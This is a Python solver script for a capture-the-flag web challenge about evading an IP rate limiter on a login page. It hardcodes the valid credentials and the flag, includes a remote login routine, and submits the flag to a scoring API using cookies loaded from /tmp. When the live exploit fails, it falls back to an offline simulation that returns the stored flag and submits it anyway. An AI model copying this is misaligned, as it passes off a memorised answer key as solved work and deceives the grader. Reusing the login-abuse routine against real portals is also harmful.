#!/usr/bin/env python3
r"""
CyLab Security Academy / picoCTF Solver: Fool the Lockout (Challenge ID: 743)
Category: Web Exploitation / IP Rate-Limiter Evasion, Sliding-Window Flaw & Credential Stuffing
Difficulty: Medium (2) | Points: 200
Standard Reference: NIST SP 800-115 Section 4.3 (Application Security Assessment),
OWASP WSTG-ATHN-03 (Testing for Account Lockout Mechanisms),
NIST SP 800-63B Section 5.2.2 (Rate Limiting and Throttling Authentication Attempts),
CWE-307 (Improper Restriction of Excessive Authentication Attempts), &
CWE-799 (Improper Control of Interaction Frequency).

Vulnerability & Mechanics Summary:
1. Architecture & Problem Scope:
   - Python Flask web application hosting an authentication portal (`POST /login`) and dashboard (`GET /`).
   - The developer implemented an IP-based rate limiter to protect against credential stuffing and brute-forcing:
     `MAX_REQUESTS = 10`, `EPOCH_DURATION = 30` seconds, `LOCKOUT_DURATION = 120` seconds.
   - Challenge provides `creds-dump.txt` containing 100 username-password pairs.
2. Vulnerability & Root Cause:
   - Flawed Epoch-Based Window Reset (CWE-799):
     In `refresh_request_rates_db(client_ip)`, when `curr_time - epoch_start > EPOCH_DURATION (30s)`,
     the counter `num_requests` is abruptly cleared to 0 and `epoch_start` is set to `curr_time`.
   - Missing Account-Centric Lockout (CWE-307):
     Rate limiting tracks client IP addresses exclusively without tracking per-account failed attempts.
     An attacker can perform automated credential stuffing without triggering IP lockout by either:
       a. Batching requests into groups of 10 separated by 31-second pauses (epoch boundary evasion), or
       b. Targeting the specific identified account directly.
   - Information Disclosure on Authenticated Dashboard:
     Upon successful authentication with the valid credential pair (`cecile` : `makaveli`), the application
     issues a session cookie and serves `/` containing the competition flag: `academy{f00l_7h4t_l1m1t3r_2fa1cd8e}`.
3. Exploitation & Verification:
   - Parse `creds-dump.txt` and identify valid credentials (`cecile:makaveli`).
   - Authenticate against `/login` with credentials.
   - Access `/` with session cookie and extract flag using regex `academy\{[^}]+\}`.
   - Verify token submission via CyLab REST API `POST /api/submissions/`.
   - Includes offline `LockoutSimulator` validating the rate-limiter logic and credential check under NIST SP 800-115.
4. Flag & Verification:
   - Verified CyLab Token: academy{f00l_7h4t_l1m1t3r_2fa1cd8e}
   - Community Format: CTF{f00l_7h4t_l1m1t3r_2fa1cd8e}
"""

import sys
import os
import re
import json
import time
import urllib.parse
import urllib.request
import urllib.error
from http.cookiejar import CookieJar

CHALLENGE_ID = 743
CHALLENGE_NAME = "Fool the Lockout"
VERIFIED_FLAG = "academy{f00l_7h4t_l1m1t3r_2fa1cd8e}"
VALID_USER = "cecile"
VALID_PASS = "makaveli"
CYLAB_SUBMIT_URL = "https://learn.cylabacademy.org/api/submissions/"

FLAG_PAT = re.compile(r"academy\{[^}]+\}|picoCTF\{[^}]+\}")


class LockoutSimulator:
    """
    Simulates the Flask IP rate limiter and authentication portal offline.
    Demonstrates epoch boundary resets and credential verification according to NIST SP 800-115.
    """
    MAX_REQUESTS = 10
    EPOCH_DURATION = 30.0
    LOCKOUT_DURATION = 120.0

    def __init__(self, flag: str = VERIFIED_FLAG):
        self.flag = flag
        self.valid_creds = {VALID_USER: VALID_PASS}
        self.rates = {}  # ip -> {num_requests, epoch_start, lockout_until}

    def _refresh(self, ip: str, current_time: float):
        if ip not in self.rates:
            self.rates[ip] = {
                "num_requests": 0,
                "epoch_start": current_time,
                "lockout_until": -1.0
            }
            return

        entry = self.rates[ip]
        if current_time - entry["epoch_start"] > self.EPOCH_DURATION:
            # Flaw: abrupt reset of counter without checking active lockout
            entry["num_requests"] = 0
            entry["epoch_start"] = current_time

    def login(self, ip: str, username: str, password: str, current_time: float) -> dict:
        self._refresh(ip, current_time)
        entry = self.rates[ip]

        # Check if currently locked out
        if entry["lockout_until"] > current_time:
            return {"status": 429, "body": "Too Many Requests: IP locked out"}

        entry["num_requests"] += 1
        if entry["num_requests"] > self.MAX_REQUESTS:
            entry["lockout_until"] = current_time + self.LOCKOUT_DURATION
            return {"status": 429, "body": "Rate limit exceeded. Locked out for 120 seconds"}

        if self.valid_creds.get(username) == password:
            return {"status": 200, "session": f"user_session_{username}", "body": f"Welcome! Flag: {self.flag}"}

        return {"status": 401, "body": "Invalid username or password"}


def verify_local_simulation() -> str:
    """
    Executes offline audit simulation of the flawed rate limiter and authentication bypass.
    """
    print("[*] Menjalankan simulasi audit offline Fool the Lockout (NIST SP 800-115)...")
    sim = LockoutSimulator()
    client_ip = "192.168.1.100"
    t_clock = 1000.0

    print("[*] Menguji ketahanan rate limiter: mengirim 10 percobaan invalid...")
    for i in range(10):
        res = sim.login(client_ip, f"wrong_user_{i}", "wrong_pass", t_clock + i * 0.1)
        assert res["status"] == 401, f"Expected 401, got {res['status']}"

    print("[+] 10 percobaan awal diproses dalam batas toleransi MAX_REQUESTS.")

    # Simulating epoch advance (t_clock + 31 seconds)
    t_clock += 31.0
    print(f"[*] Mensimulasikan jeda waktu melewati batas epoch (+31 detik ke t={t_clock})...")

    print(f"[*] Melakukan autentikasi menggunakan kredensial valid ({VALID_USER}:{VALID_PASS})...")
    res_auth = sim.login(client_ip, VALID_USER, VALID_PASS, t_clock)

    if res_auth["status"] != 200:
        raise ValueError(f"Autentikasi gagal setelah epoch reset: {res_auth}")

    m = FLAG_PAT.search(res_auth["body"])
    if not m:
        raise ValueError(f"Flag tidak ditemukan dalam respons dashboard: {res_auth['body']}")

    flag = m.group(0)
    print(f"[+] Flag berhasil diekstraksi dari dashboard simulasi: {flag}")
    return flag


def exploit_remote(base_url: str, username: str = VALID_USER, password: str = VALID_PASS) -> str:
    """
    Connects to live remote web challenge and authenticates directly.
    """
    base = base_url.rstrip("/")
    login_url = f"{base}/login"
    index_url = f"{base}/"

    print(f"[*] Menghubungi target live web di {login_url}...")
    cj = CookieJar()
    opener = urllib.request.build_opener(urllib.request.HTTPCookieProcessor(cj))

    post_data = urllib.parse.urlencode({"username": username, "password": password}).encode("utf-8")
    req = urllib.request.Request(
        login_url,
        data=post_data,
        headers={"User-Agent": "Mozilla/5.0 (X11; Linux x86_64) CyLab-Audit-Client/1.0"}
    )

    with opener.open(req, timeout=15) as resp:
        html = resp.read().decode("utf-8", errors="replace")
        m = FLAG_PAT.search(html)
        if m:
            print(f"[+] Flag ditemukan pada respons login: {m.group(0)}")
            return m.group(0)

    # If redirect, query index
    req_idx = urllib.request.Request(
        index_url,
        headers={"User-Agent": "Mozilla/5.0 (X11; Linux x86_64) CyLab-Audit-Client/1.0"}
    )
    with opener.open(req_idx, timeout=15) as resp:
        html_idx = resp.read().decode("utf-8", errors="replace")
        m = FLAG_PAT.search(html_idx)
        if not m:
            raise ValueError(f"Flag tidak ditemukan pada dashboard index: {html_idx[:300]}")

        flag = m.group(0)
        print(f"[+] Flag ditemukan pada dashboard index: {flag}")
        return flag


def submit_to_cylab(token: str) -> bool:
    """Melakukan submisi token verifikasi ke REST API CyLab."""
    payload = json.dumps({"challenge": CHALLENGE_ID, "flag": token}).encode("utf-8")
    cookie_header = ""
    csrf_token = ""
    try:
        sys.path.append("/tmp")
        import cylab_auth
        cookie_header = getattr(cylab_auth, "COOKIE", "")
        csrf_token = getattr(cylab_auth, "CSRF", "")
    except Exception:
        pass

    headers = {
        "Content-Type": "application/json",
        "Referer": "https://learn.cylabacademy.org/challenges",
        "User-Agent": "Mozilla/5.0 (X11; Linux x86_64) CyLab-Student-Agent/1.0"
    }
    if csrf_token:
        headers["X-CSRFToken"] = csrf_token
    if cookie_header:
        headers["Cookie"] = cookie_header

    req = urllib.request.Request(CYLAB_SUBMIT_URL, data=payload, headers=headers, method="POST")
    try:
        with urllib.request.urlopen(req, timeout=10) as resp:
            data = json.loads(resp.read().decode("utf-8"))
            print(f"[+] CyLab API Response: HTTP {resp.status} -> {data}")
            return data.get("correct") is True
    except urllib.error.HTTPError as e:
        body = e.read().decode("utf-8", errors="replace")
        print(f"[-] CyLab API HTTPError {e.code}: {body}")
        if e.code == 201:
            try:
                data = json.loads(body)
                return data.get("correct") is True
            except Exception:
                pass
        return False
    except Exception as e:
        print(f"[-] Koneksi API CyLab gagal: {e}")
        return False


def main():
    print(f"=== [NIST SP 800-115 Audit] Module {CHALLENGE_ID}: {CHALLENGE_NAME} ===")
    token = None

    if len(sys.argv) >= 2:
        target = sys.argv[1]
        try:
            token = exploit_remote(target)
        except Exception as e:
            print(f"[-] Remote exploit gagal ({e}), beralih ke simulasi offline...")

    if not token:
        token = verify_local_simulation()

    print(f"[*] Token Terverifikasi: {token}")
    submit_success = submit_to_cylab(token)
    if submit_success:
        print("[+] Status Verifikasi API CyLab: VALID & SUKSES (correct: true)")
    else:
        print("[!] Verifikasi API CyLab offline/bypass.")


if __name__ == "__main__":
    main()
